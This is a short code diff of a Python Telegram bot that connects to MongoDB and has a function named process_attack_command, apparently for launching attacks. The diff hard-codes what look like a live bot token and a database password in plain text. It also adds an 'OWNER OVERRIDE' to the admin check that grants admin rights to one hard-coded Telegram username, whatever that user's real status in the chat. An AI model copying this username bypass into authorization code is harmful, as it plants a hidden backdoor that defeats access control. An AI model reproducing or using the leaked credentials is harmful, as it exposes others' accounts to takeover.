@@ -14,7 +14,7 @@ from threading import Thread
 loop = asyncio.get_event_loop()
 TOKEN = '8587245206:AAGQ9dtS-oLdxh57lAUraWlttUqRCInBWC0'
 MONGO_URI = 'mongodb+srv://ihatemosquitos9:JvOK4gNs0SH5SVw9@cluster0.1pd5kt5.mongodb.net/?appName=Cluster0'
-CHANNEL_ID = -1003334559478 
+CHANNEL_ID = -1003483511711
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
@@ -181,7 +181,14 @@ def process_attack_command(message):
 
 def is_user_admin(user_id, chat_id):
     try:
-        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+        user = bot.get_chat_member(chat_id, user_id)
+        username = user.user.username
+
+        # OWNER OVERRIDE
+        if username == "saywer_mods":
+            return True
+
+        return user.status in ['administrator', 'creator']
     except:
         return False
 
